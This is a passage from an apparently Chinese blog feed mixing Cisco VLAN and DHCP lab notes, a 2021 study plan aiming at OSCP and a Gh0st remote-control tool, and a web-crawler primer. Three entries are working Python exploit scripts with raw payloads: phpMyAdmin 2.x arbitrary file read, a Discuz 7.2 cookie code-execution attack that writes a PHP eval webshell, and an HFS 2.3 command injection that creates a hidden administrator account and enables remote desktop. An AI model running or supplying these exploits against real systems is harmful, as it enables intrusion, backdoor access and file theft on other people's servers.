配置IP为下面主机的默认网关</p></blockquote><ul><li><p>下行接口配置为：</p><blockquote><p>switchport mode access   //这条命令必须敲出来，否则不能成功执行下面这条命令switchport mode trunk ip routing</p></blockquote></li><li><p>未完待续…</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络工程师 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Cisco-Vlan与Trunk</title>
      <link href="2021/01/29/Cisco-Vlan%E4%B8%8ETrunk/"/>
      <url>2021/01/29/Cisco-Vlan%E4%B8%8ETrunk/</url>
      
        <content type="html"><![CDATA[<h2 id="一：何为VLAN"><a href="#一：何为VLAN" class="headerlink" title="一：何为VLAN"></a>一：何为VLAN</h2><blockquote><p>虚拟局域网（VLAN）是一组逻辑上的设备和用户，这些设备和用户并不受物理位置的限制，可以根据功能、部门及应用等因素将它们组织起来，相互之间的通信就好像它们在同一个网段中一样，由此得名虚拟局域网</p></blockquote><h4 id="VLAN优势"><a href="#VLAN优势" class="headerlink" title="VLAN优势"></a>VLAN优势</h4><blockquote><p>广播控制/安全性/宽带利用/延迟</p></blockquote><h4 id="VLAN种类"><a href="#VLAN种类" class="headerlink" title="VLAN种类"></a>VLAN种类</h4><ul><li>基于端口划分的静态VLAN  //静态VLAN</li><li>基于MAC地址划分的动态VLAN   //动态VLAN </li></ul><h4 id="创建VLAN"><a href="#创建VLAN" class="headerlink" title="创建VLAN"></a>创建VLAN</h4><ul><li><p>方法一：全局配置模式创建vlan</p><pre><code class="xaml">vlan vlan-id   //创建vlan几号name  vlan-name   //给vlan命名</code></pre></li><li><p>方法二：VLAN数据库配置模式</p><pre><code class="xaml">vlan datebase    //进入vlan databasevlan vlan-id name skill  //创建vlan并且命名为skill</code></pre></li></ul><h4 id="删除VLAN"><a href="#删除VLAN" class="headerlink" title="删除VLAN"></a>删除VLAN</h4><ul><li><p>进入vlan数据库或全局模式：</p><pre><code class="xaml">no vlan vlan-id</code></pre></li><li><p>将接口加入vlan:</p><ul><li><p>进入将要键入vlan的接口然后输入</p><pre><code class="xaml">switchport access vlan 2</code></pre></li><li><p>同时将多个接口加入vlan</p><pre><code class="xaml">interface range f0/1-10  //进入多个端口switchport access vlan 2 //将1-10口同时加入vlan2</code></pre></li><li><p>查看vlan 信息</p><pre><code class="xaml">show vlan brief   //查看vlan的简要信息</code></pre></li></ul></li></ul><h2 id="二：何为Trunk"><a href="#二：何为Trunk" class="headerlink" title="二：何为Trunk"></a>二：何为Trunk</h2><blockquote><p>作用：实现跨交换机之间的vlan通信</p></blockquote><h4 id="链路类型"><a href="#链路类型" class="headerlink" title="链路类型"></a>链路类型</h4><ul><li>接入链路</li><li>中级链路：可以承载多个vlan</li></ul><h4 id="VLAN标识"><a href="#VLAN标识" class="headerlink" title="VLAN标识"></a>VLAN标识</h4><ul><li>ISL(思科私有的标记方法)ISL外部封装26个字节，尾部4个字节，一共30个字节</li><li>IEEE802.1q（共有的标记方法）内部封装在标准以太网帧中插入了4个字节，其中12位vlan标识</li></ul><h4 id="ISL和IEEE802-1q的异同"><a href="#ISL和IEEE802-1q的异同" class="headerlink" title="ISL和IEEE802.1q的异同"></a>ISL和IEEE802.1q的异同</h4><ul><li>相同点：<ul><li>都是为了显示vlan信息</li></ul></li><li>不同点：<ul><li>IEEE802.1q是共有的标记方式，ISL是CISCO私有的</li><li>ISL采用外部标记方法，802.1q采用的是内部标记方法</li><li>ISL标记的长度为30个字节，802.1q的标记长度为4个字节</li></ul></li></ul><h4 id="Trunk的模式和协商"><a href="#Trunk的模式和协商" class="headerlink" title="Trunk的模式和协商"></a>Trunk的模式和协商</h4><ul><li><p>trunk模式：</p><ul><li>接入（access）</li><li>干道（trunk）</li><li>动态企望（desirable）主动</li><li>动态自动 （auto）被动</li></ul></li><li><p>trunk模式协商结果：</p><table><thead><tr><th align="center">SW1端口模式</th><th align="center">SW2端口模式</th><th align="center">结果</th></tr></thead><tbody><tr><td align="center">Trunk</td><td align="center">Auto</td><td align="center">Trunk</td></tr><tr><td align="center">Trunk</td><td align="center">desirable</td><td align="center">Trunk</td></tr><tr><td align="center">Auto</td><td align="center">Auto</td><td align="center">Access</td></tr><tr><td align="center">Auto</td><td align="center">desirable</td><td align="center">Trunk</td></tr><tr><td align="center">desirable</td><td align="center">desirable</td><td align="center">Trunk</td></tr></tbody></table></li></ul><h4 id="Trunk的配置"><a href="#Trunk的配置" class="headerlink" title="Trunk的配置"></a>Trunk的配置</h4><pre><code class="xaml">接口模式：switchport  mode trunk //直接配置为trunk                        //dynamic desirable 配置为动态企望                         //dynamic auto   动态自动                          //配置为接入链路</code></pre><h4 id="在Trunk上移除VLAN"><a href="#在Trunk上移除VLAN" class="headerlink" title="在Trunk上移除VLAN"></a>在Trunk上移除VLAN</h4><pre><code class="xaml">进入trunk接口：switchport trunk allowed vlan remove 3   //中继链路不允许传送vlan3的数据</code></pre><h4 id="在Trunk上添加某VLAN"><a href="#在Trunk上添加某VLAN" class="headerlink" title="在Trunk上添加某VLAN"></a>在Trunk上添加某VLAN</h4><pre><code class="x">进入trunk接口：switchport trunk allowed vlan add 3 </code></pre><h4 id="查看接口模式"><a href="#查看接口模式" class="headerlink" title="查看接口模式"></a>查看接口模式</h4><pre><code class="xaml">show interface f0/5 switchport  </code></pre><h2 id="三：EthernetChannel"><a href="#三：EthernetChannel" class="headerlink" title="三：EthernetChannel"></a>三：EthernetChannel</h2><blockquote><p>以太网通道:</p><ul><li>多条线路负载均衡，带宽提高</li><li>容错，当一条线路失效时，其他的线路通信，不会丢包</li></ul></blockquote><h4 id="以太网通道的配置"><a href="#以太网通道的配置" class="headerlink" title="以太网通道的配置"></a>以太网通道的配置</h4><pre><code class="xaml">interface range f0/6-8    //进入多端口switchport mode trunk     //配置trunkchannel-group 1 mode on     //配置以太网通道</code></pre><h4 id="查看以太网通道的配置"><a href="#查看以太网通道的配置" class="headerlink" title="查看以太网通道的配置"></a>查看以太网通道的配置</h4><pre><code class="xaml">show  etherchannel summary</code></pre><h4 id="太网通道遵循规则"><a href="#太网通道遵循规则" class="headerlink" title="太网通道遵循规则"></a>太网通道遵循规则</h4><ul><li>参与捆绑的端口必须同属于一个vlan,如果实在中继模式下，要求所有参加捆绑的端口配置成相同的中继模式</li><li>所有参与捆绑的端口的物理参数设置必须相同，应该有同样的速度和全半双工模式设置</li></ul><h2 id="四：配置DHCP服务"><a href="#四：配置DHCP服务" class="headerlink" title="四：配置DHCP服务"></a>四：配置DHCP服务</h2><h4 id="路由器上配置DHCP服务"><a href="#路由器上配置DHCP服务" class="headerlink" title="路由器上配置DHCP服务"></a>路由器上配置DHCP服务</h4><pre><code class="xaml">ip dhcp pool name    //定义地址池network 192.168.1.0 255.255.255.0    //动态分配IP地址段default-router  192.168.1.254    //动态分配的网关地址dns-server   202.102.152.3  //动态分配的DNS服务器地址，此命令后面可以跟多个备用的DNS地址ip dhcp excluded-address 192.168.0.1    //预留已经静态分配的IP地址</code></pre><h2 id="实验一：配置Trunk"><a href="#实验一：配置Trunk" class="headerlink" title="实验一：配置Trunk"></a>实验一：配置Trunk</h2><p><img src="https://s3.ax1x.com/2021/01/29/yCqRSI.png"></p><pre><code class="xaml">Switch&gt;enableSwitch#configConfiguring from terminal, memory, or network [terminal]?Enter configuration commands, one per line. End with CNTL/Z.Switch(config)#vlan 2Switch(config-vlan)#name skillSwitch(config-vlan)#exitSwitch(config)#interface f0/2Switch(config-if)#switchport access vlan 2Switch(config-if)#exitSwitch(config)#interface f0/24Switch(config-if)#switchport mode trunkSwitch(config-if)#%LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/24, changed state to down%LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/24, changed state to upSwitch(config-if)#Switch#</code></pre><pre><code class="xaml">Switch&gt;enableSwitch#configConfiguring from terminal, memory, or network [terminal]?Enter configuration commands, one per line. End with CNTL/Z.Switch(config)#vlan 2Switch(config-vlan)#name skillSwitch(config-vlan)#exitSwitch(config)#interface f0/2Switch(config-if)#switchport access vlan 2Switch(config-if)#exitSwitch(config)#interface f0/24Switch(config-if)#switchport mode trunkSwitch(config-if)#%LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/24, changed state to down%LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/24, changed state to upSwitch(config-if)#Switch#</code></pre><p><img src="https://s3.ax1x.com/2021/01/29/yCLe0O.png"></p><h2 id="实验二：配置以太网通道"><a href="#实验二：配置以太网通道" class="headerlink" title="实验二：配置以太网通道"></a>实验二：配置以太网通道</h2><p><img src="https://s3.ax1x.com/2021/01/29/yCOFUg.png"></p><pre><code class="xaml">Switch(config)#interface range f0/23-24Switch(config-if-range)#switchport mode trunkSwitch(config-if-range)#%LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/23, changed state to down%LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/23, changed state to upSwitch(config-if-range)#channel-group 1 mode onSwitch(config-if-range)#Creating a port-channel interface Port-channel 1%LINK-5-CHANGED: Interface Port-channel 1, changed state to up%LINEPROTO-5-UPDOWN: Line protocol on Interface Port-channel 1, changed state to up%LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/23, changed state to down%LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/23, changed state to up%LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/24, changed state to down%LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/24, changed state to upSwitch(config-if-range)#^ZSwitch#%SYS-5-CONFIG_I: Configured from console by consoleSwitch#Switch#show etherchannel summaryFlags: D - down P - in port-channelI - stand-alone s - suspendedH - Hot-standby (LACP only)R - Layer3 S - Layer2U - in use f - failed to allocate aggregatoru - unsuitable for bundlingw - waiting to be aggregatedd - default portNumber of channel-groups in use: 1Number of aggregators: 1Group Port-channel Protocol Ports------+-------------+-----------+----------------------------------------------1 Po1(SU) - Fa0/23(P) Fa0/24(P)</code></pre><pre><code class="xaml">Switch(config)#interface range f0/23-24Switch(config-if-range)#switchport mode trunkSwitch(config-if-range)#%LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/23, changed state to down%LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/23, changed state to upSwitch(config-if-range)#chanSwitch(config-if-range)#channel-group 1 mode onSwitch(config-if-range)#Creating a port-channel interface Port-channel 1%LINK-5-CHANGED: Interface Port-channel 1, changed state to up%LINEPROTO-5-UPDOWN: Line protocol on Interface Port-channel 1, changed state to up%LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/23, changed state to down%LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/23, changed state to up%LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/24, changed state to down%LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/24, changed state to upSwitch(config-if-range)#^ZSwitch#%SYS-5-CONFIG_I: Configured from console by consoleSwitch#show etherchannel summaryFlags: D - down P - in port-channelI - stand-alone s - suspendedH - Hot-standby (LACP only)R - Layer3 S - Layer2U - in use f - failed to allocate aggregatoru - unsuitable for bundlingw - waiting to be aggregatedd - default portNumber of channel-groups in use: 1Number of aggregators: 1Group Port-channel Protocol Ports------+-------------+-----------+----------------------------------------------1 Po1(SU) - Fa0/23(P) Fa0/24(P)</code></pre><h2 id="实验三：路由器配置DHCP"><a href="#实验三：路由器配置DHCP" class="headerlink" title="实验三：路由器配置DHCP"></a>实验三：路由器配置DHCP</h2><p><img src="https://s3.ax1x.com/2021/01/29/yCO0aD.png"></p><pre><code class="xaml">Router(config)#ip dhcp pool kingRouter(dhcp-config)#network 192.168.1.0 255.255.255.0Router(dhcp-config)#default-router 192.168.1.1Router(dhcp-config)#dns-server 202.102.152.3Router(dhcp-config)#exitRouter(config)#ip dhcp excluded-address 192.168.1.1Router(config)#Router#</code></pre><h4 id="未完待续…"><a href="#未完待续…" class="headerlink" title="未完待续…"></a>未完待续…</h4>]]></content>
      
      
      <categories>
          
          <category> 网络工程师 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021年计划</title>
      <link href="2021/01/29/2021%E5%B9%B4%E8%AE%A1%E5%88%92/"/>
      <url>2021/01/29/2021%E5%B9%B4%E8%AE%A1%E5%88%92/</url>
      
        <content type="html"><![CDATA[<h3 id="一：2021年计划"><a href="#一：2021年计划" class="headerlink" title="一：2021年计划"></a>一：2021年计划</h3><ul><li><p>学习累积，实战巩固</p><ul><li><p>学习方向：</p><ol><li><p>编程：重新掌握C与C++，以Gh0st远控程序项目为主导（半年内掌握）</p></li><li><p>运维：复习RHCSA内容并考出RHCE证书</p></li><li><p>攻击：复习WEB攻击手法，考取OSCP证书 </p></li></ol></li><li><p>实战方向:</p><ul><li>创建安全团队,落地实战项目，后续发财之路</li><li>Shell+Data+Development</li></ul></li></ul></li><li><p>时间安排</p></li></ul><table><thead><tr><th>目标</th><th>计划时间</th></tr></thead><tbody><tr><td>OSCP</td><td>三个月</td></tr><tr><td>RHCE</td><td>三个月</td></tr><tr><td>开发技能</td><td>三个月</td></tr></tbody></table><ul><li>学习资料<ul><li>OSCP官方资料</li><li>后渗透资料汇总</li><li>红帽培训考证</li><li>C/C++传智播客</li><li>老狼Gh0st远控编写</li><li>………</li></ul></li></ul><h3 id="二：总体方向"><a href="#二：总体方向" class="headerlink" title="二：总体方向"></a>二：总体方向</h3><ul><li><p>技术增长第一，项目累积第二</p></li><li><p>走实战道路,积累项目经验</p></li><li><p>就近原则，钱即是目标</p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>网络爬虫-豆瓣影站</title>
      <link href="2021/01/27/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB-%E8%B1%86%E7%93%A3%E5%BD%B1%E7%AB%99/"/>
      <url>2021/01/27/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB-%E8%B1%86%E7%93%A3%E5%BD%B1%E7%AB%99/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Python专题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>安全开发-PHPMyadmin任意文件读取脚本编写</title>
      <link href="2021/01/27/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-PHPMyadmin%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/"/>
      <url>2021/01/27/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-PHPMyadmin%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><ul><li>靶机：PHPMyadmin2.x版本</li><li>攻击机：Python环境</li></ul><h3 id="漏洞起因"><a href="#漏洞起因" class="headerlink" title="漏洞起因"></a>漏洞起因</h3><blockquote><p>phpmyadmin 2.x 版本中存在一处反序列化漏洞，通过该漏洞，攻击者可以读取任意文件或执行任意代码。</p></blockquote><pre><code class="xaml">POST /scripts/setup.php HTTP/1.1      #访问指定路径Host: your-ip:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 80action=test&amp;configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}#POST数据中修改访问/etc/passwd文件</code></pre><p><img src="https://s3.ax1x.com/2021/01/27/sxEtIK.png"></p><h3 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h3><pre><code class="python">import requestsfilename=input("请输入需要读取的文件路径：")url="http://192.168.76.133:8080/scripts/setup.php"def read_file(filename):    data={'action':'test','configuration':'O:10:"PMA_Config":1:{s:6:"source",s:11:"'+filename+'";}'}    result=requests.post(url,data=data).text    print(result)read_file(filename)</code></pre><h3 id="实验截图"><a href="#实验截图" class="headerlink" title="实验截图"></a>实验截图</h3><p><img src="https://s3.ax1x.com/2021/01/27/sxEqiT.png"></p>]]></content>
      
      
      <categories>
          
          <category> Python专题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>安全开发-Discuz7.2Getshell脚本编写</title>
      <link href="2021/01/27/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-Discuz7-2Getshell%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/"/>
      <url>2021/01/27/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-Discuz7-2Getshell%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h3 id="一：实验环境"><a href="#一：实验环境" class="headerlink" title="一：实验环境"></a>一：实验环境</h3><ul><li>靶机：安装部署Ucenter与Discuz7.2</li><li>攻击机：Python环境</li></ul><h3 id="二：漏洞起因"><a href="#二：漏洞起因" class="headerlink" title="二：漏洞起因"></a>二：漏洞起因</h3><pre><code class="xaml">GET /viewthread.php?tid=10&amp;extra=page%3D1 HTTP/1.1    #固定访问格式Host: your-ip:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();    #代码执行Connection: close</code></pre><h3 id="三：代码编写"><a href="#三：代码编写" class="headerlink" title="三：代码编写"></a>三：代码编写</h3><pre><code class="python">'''POC:"&amp;x=$id=('echo%20“&lt;?php @eval($_POST[x]);?&gt;”&gt;shell.php');shell_exec($id);"'''import requestsdata=input("请输入写入数据：")file=input("请输入写入文件名：")url="http://192.168.31.49/discuz72/viewthread.php?tid=10&amp;extra=page%3D1"+"&amp;x="+"$id=('echo%20"+data+"%20&gt;%20"+file+"');shell_exec($id);"cookie={"Cookie":"GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval($_REQUEST[x]);"}print(url)code=requests.post(url,headers=cookie).status_codeif code==200:    print("ok")else:    print("no")</code></pre><h3 id="实验截图"><a href="#实验截图" class="headerlink" title="实验截图"></a>实验截图</h3><p>…</p>]]></content>
      
      
      <categories>
          
          <category> Python专题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>安全开发-HFS漏洞利用脚本编写</title>
      <link href="2021/01/25/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-HFS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/"/>
      <url>2021/01/25/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-HFS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h3 id="一：实验环境"><a href="#一：实验环境" class="headerlink" title="一：实验环境"></a>一：实验环境</h3><blockquote><p>攻击者IP：192.168.31.20</p><p>靶机IP：192.168.31.244</p><p>攻击者环境：Python3 requests库</p><p>靶机环境：开启HFS~网络文件服务器 2.3Beta</p></blockquote><h3 id="二：攻击准备"><a href="#二：攻击准备" class="headerlink" title="二：攻击准备"></a>二：攻击准备</h3><ul><li>添加用户EXP：</li></ul><pre><code class="yaml">/?search==%00%7B.exec%7Ccmd.exe%20/c%20net%20user%20TechSupport%20comeonbaby%20/add%20%26%20net%20localgroup%20administrators%20TechSupport%20/add.%7D</code></pre><ul><li>开启3389EXP：</li></ul><pre><code class="yaml">/?search==%00%7B.exec%7Ccmd.exe%20/c%20REG%20ADD%20HKLM%5CSYSTEM%5CCurrentControlSet%5CControl%5CTerminal%22%20%22Server%20/v%20fDenyTSConnections%20/t%20REG_DWORD%20/d%2000000000%20/f.%7D</code></pre><h3 id="三：脚本开发思路"><a href="#三：脚本开发思路" class="headerlink" title="三：脚本开发思路"></a>三：脚本开发思路</h3><ol><li>接受输入的漏洞地址</li><li>组合漏洞地址并请求</li><li>判断漏洞是否利用成功</li><li>将利用成功的进行打印</li></ol><h3 id="四：漏洞利用脚本"><a href="#四：漏洞利用脚本" class="headerlink" title="四：漏洞利用脚本"></a>四：漏洞利用脚本</h3><blockquote><pre><code class="python">import requestsurl="http://192.168.31.244:8080/"add_user="/?search==%00%7B.exec%7Ccmd.exe%20/c%20net%20user%20TechSupport%20comeonbaby%20/add%20%26%20net%20localgroup%20administrators%20TechSupport%20/add.%7D"open_3389="/?search==%00%7B.exec%7Ccmd.exe%20/c%20REG%20ADD%20HKLM%5CSYSTEM%5CCurrentControlSet%5CControl%5CTerminal%22%20%22Server%20/v%20fDenyTSConnections%20/t%20REG_DWORD%20/d%2000000000%20/f.%7D"url_adduser=url+add_userurl_open3389=url+open_3389def adduser():    code=requests.get(url_adduser).status_code    if code==200:        print("adduser success")    else:        print("adduser failed")def open3389():    code1=requests.get(url_open3389).status_code    if code1==200:        print("open3389 success")    else:        print("open3389 failed")adduser()open3389()</code></pre></blockquote><h3 id="五：实验截图"><a href="#五：实验截图" class="headerlink" title="五：实验截图"></a>五：实验截图</h3><p><img src="https://s3.ax1x.com/2021/01/25/sLjeFf.png" alt="漏洞攻击成功"></p><p><img src="https://s3.ax1x.com/2021/01/25/sLjGT0.md.png" alt="服务端状态"></p><p><img src="https://s3.ax1x.com/2021/01/25/sLjapF.png" alt="最终效果图"></p><ul><li>未完待续…</li></ul>]]></content>
      
      
      <categories>
          
          <category> Python专题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>爬虫-快速入门</title>
      <link href="2021/01/25/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB-%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/"/>
      <url>2021/01/25/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB-%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="一：何为爬虫"><a href="#一：何为爬虫" class="headerlink" title="一：何为爬虫"></a>一：何为爬虫</h3><h4 id="1：什么是互联网？"><a href="#1：什么是互联网？" class="headerlink" title="1：什么是互联网？"></a>1：什么是互联网？</h4><blockquote><p>互联网是由网络设备（网线，路由器，交换机，防火墙等等）和多台计算机连接而成，像张网一样。</p></blockquote><h4 id="2：互联网建立的目的？"><a href="#2：互联网建立的目的？" class="headerlink" title="2：互联网建立的目的？"></a>2：互联网建立的目的？</h4><blockquote><p>互联网的核心价值在于数据的共享/传递：数据是存放于一台台计算机上的，而将计算机互联到一起的目的就是为了能够方便彼此之间的数据共享/传递，否则你只能拿U盘去别人的计算机上拷贝数据了。</p></blockquote><h4 id="3：什么是上网？爬虫要做的是什么？"><a href="#3：什么是上网？爬虫要做的是什么？" class="headerlink" title="3：什么是上网？爬虫要做的是什么？"></a>3：什么是上网？爬虫要做的是什么？</h4><blockquote><p>我们所谓的上网便是由用户端计算机发送请求给目标计算机，将目标计算机的数据下载到本地的过程。</p><ol><li>用户获取网络数据的方式是：浏览器提交请求-&gt;下载网页代码-&gt;解析/渲染成页面。</li><li>而爬虫程序要做的就是：模拟浏览器发送请求-&gt;下载网页代码-&gt;只提取有用的数据-&gt;存放于数据库或文件中</li><li>1与2区别是：我们的爬虫程序只提取网页代码中对我们有用的数据</li></ol></blockquote><h4 id="4：总结爬虫"><a href="#4：总结爬虫" class="headerlink" title="4：总结爬虫"></a>4：总结爬虫</h4><blockquote><ul><li>爬虫的比喻： 如果我们把互联网比作一张大的蜘蛛网，那一台计算机上的数据便是蜘蛛网上的一个猎物，而爬虫程序就是一只小蜘蛛，沿着蜘蛛网抓取自己想要的猎物/数据</li><li> 爬虫的定义：向网站发起请求，获取资源后分析并提取有用数据的程序 </li><li>爬虫的价值：互联网中最有价值的便是数据，比如天猫商城的商品信息，链家网的租房信息，雪球网的证券投资信息等等，这些数据都代表了各个行业的真金白银，可以说，谁掌握了行业内的第一手数据，谁就成了整个行业的主宰，如果把整个互联网的数据比喻为一座宝藏，那我们的爬虫课程就是来教大家如何来高效地挖掘这些宝藏，掌握了爬虫技能，你就成了所有互联网信息公司幕后的老板，换言之，它们都在免费为你提供有价值的数据。</li></ul></blockquote><h3 id="二：爬虫的基本流程"><a href="#二：爬虫的基本流程" class="headerlink" title="二：爬虫的基本流程"></a>二：爬虫的基本流程</h3><p><img src="https://images2017.cnblogs.com/blog/1036857/201711/1036857-20171102174025326-341248106.png"></p><ul><li><p>发起请求</p><blockquote><p>使用http库向目标站点发起请求，即发送一个Request<br>Request包含：请求头、请求体等</p></blockquote></li><li><p>获取响应内容</p><blockquote><p>如果服务器能正常响应，则会得到一个Response<br>Response包含：html，json，图片，视频等</p></blockquote></li><li><p>解析内容</p><blockquote><p>解析html数据：正则表达式，第三方解析库如Beautifulsoup，pyquery等<br>解析json数据：json模块<br>解析二进制数据:以b的方式写入文件</p></blockquote></li><li><p>保存数据</p><blockquote><p>数据库<br>XML文件</p></blockquote></li></ul><h3 id="三：请求与响应"><a href="#三：请求与响应" class="headerlink" title="三：请求与响应"></a>三：请求与响应</h3><p><img src="https://images2017.cnblogs.com/blog/1036857/201711/1036857-20171102180223529-1349691987.png"></p><ul><li>Request：用户将自己的信息通过浏览器（socket client）发送给服务器（socket server）</li><li>Response：服务器接收请求，分析用户发来的请求信息，然后返回数据</li><li>PS：浏览器在接收Response后，会解析其内容来显示给用户，而爬虫程序在模拟浏览器发送请求然后接收Response后，是要提取其中的有用数据。</li></ul><h3 id="四：Request"><a href="#四：Request" class="headerlink" title="四：Request"></a>四：Request</h3><blockquote><ol><li>请求方式：</li></ol><ul><li><p>常用的请求方式：GET，POST</p></li><li><p>其他请求方式：HEAD，PUT，DELETE，OPTHONS</p></li><li><p>ps：用浏览器演示get与post的区别，（用登录演示post）</p><p>post与get请求最终都会拼接成这种形式：k1=xxx&amp;k2=yyy&amp;k3=zzz<br>post请求的参数放在请求体内：可用浏览器查看，存放于form data内<br>get请求的参数直接放在url后</p></li></ul></blockquote><blockquote><ol start="2"><li>请求url：url全称统一资源定位符，如一个网页文档，一张图片 一个视频等都可以用url唯一来确定<ul><li>url编码<br><a href="https://www.baidu.com/s?wd=%E5%9B%BE%E7%89%87">https://www.baidu.com/s?wd=图片</a><br>图片会被编码（看示例代码）</li><li>网页的加载过程是：<br>加载一个网页，通常都是先加载document文档，<br>在解析document文档的时候，遇到链接，则针对超链接发起下载图片的请求</li></ul></li></ol></blockquote><blockquote><ol start="3"><li>请求头<ul><li>User-agent：请求头中如果没有user-agent客户端配置，<pre><code>服务端可能将你当做一个非法用户hostcookies：cookie用来保存登录信息</code></pre></li></ul></li></ol></blockquote><blockquote><p>一般做爬虫都会加上请求头</p></blockquote><blockquote><ol start="4"><li>请求体<ul><li>如果是get方式，请求体没有内容</li><li> 如果是post方式，请求体是format data</li></ul></li></ol></blockquote><blockquote><p>ps：<br>1、登录窗口，文件上传等，信息都会被附加到请求体内<br>2、登录，输入错误的用户名密码，然后提交，就可以看到post，正确登录后页面通常会跳转，无法捕捉到post</p></blockquote><pre><code class="python">from urllib.parse import urlencodeimport requestsheaders={'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','Cookie':'H_WISE_SIDS=101556_115474_115442_114743_108373_100099_115725_106201_107320_115339_114797_115553_116093_115546_115625_115446_114329_115350_114275_116040_110085; PSTM=1494300712; BAIDUID=42FE2934E37AF7AD1FA31D8CC7006D45:FG=1; BIDUPSID=2996557DB2710279BD865C50F9A68615; MCITY=-%3A; __cfduid=da9f97dea6458ca26aa4278280752ebb01508939712; BDSFRCVID=PGLsJeCCxG3wt_3ZUrBLDfv2D_qBZSjAgcEe3J; H_BDCLCKID_SF=tJAOoCLytI03qn5zq4Oh-4oHhxoJq5QxbT7Z0l8KtfcNVJQs-lCMhbtp-l3GJPoLWK6hBKQmWIQHDnbsbq0M2tcQXR5-WROCte74KKJx-4PWeIJo5tKh04JbhUJiB5OLBan7Lq7xfDDbbDtmej_3-PC3ql6354Rj2C_X3b7EfKjIOtO_bfbT2MbyeqrNQlTkLIvXoITJQD_bEP3Fbfj2DPQ3KabZqjDjJbue_I05f-oqebT4btbMqRtthf5KeJ3KaKrKW5rJabC3hPJeKU6qLT5Xjh6B5qDfyDoAbKOt-IOjhb5hMpnx-p0njxQyaR3RL2Kj0p_EWpcxsCQqLUonDh8L3H7MJUntKjnRonTO5hvvhb6O3M7-XpOhDG0fJjtJJbksQJ5e24oqHP-kKPrV-4oH5MQy5toyHD7yWCvjWlT5OR5Jj6KMjMkb3xbz2fcpMIrjob8M5CQESInv3MA--fcLD2ch5-3eQgTI3fbIJJjWsq0x0-jle-bQypoa-U0j2COMahkMal7xO-QO05CaD53yDNDqtjn-5TIX_CjJbnA_Hn7zepoxebtpbt-qJJjzMerW_Mc8QUJBH4tR-T3keh-83xbnBT5KaKO2-RnPXbcWjt_lWh_bLf_kQN3TbxuO5bRiL66I0h6jDn3oyT3VXp0n54nTqjDHfRuDVItXf-L_qtDk-PnVeUP3DhbZKxtqtDKjXJ7X2fclHJ7z-R3IBPCD0tjk-6JnWncKaRcI3poiqKtmjJb6XJkl2HQ405OT-6-O0KJcbRodobAwhPJvyT8DXnO7-fRTfJuJ_DDMJDD3fP36q4QV-JIehmT22jnT32JeaJ5n0-nnhP3mBTbA3JDYX-Oh-jjRX56Gh